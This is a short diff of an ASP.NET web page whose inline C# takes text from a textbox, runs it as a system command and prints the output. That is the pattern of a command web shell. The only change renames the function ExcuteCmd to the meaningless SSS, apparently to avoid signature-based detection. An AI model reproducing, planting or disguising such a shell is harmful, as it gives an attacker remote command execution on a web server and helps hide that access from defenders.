@@ -5,7 +5,7 @@
 void Page_Load(object sender, EventArgs e)
 {
 }
-string ExcuteCmd(string arg)
+string SSS(string arg)
 {
 ProcessStartInfo psi = new ProcessStartInfo();
 psi.RedirectStandardOutput = true;
@@ -19,7 +19,7 @@ return s;
 void cmdExe_Click(object sender, System.EventArgs e)
 {
 Response.Write("<pre>");
-Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+Response.Write(Server.HtmlEncode(SSS(txtArg.Text)));
 Response.Write("</pre>");
 }
 </script>
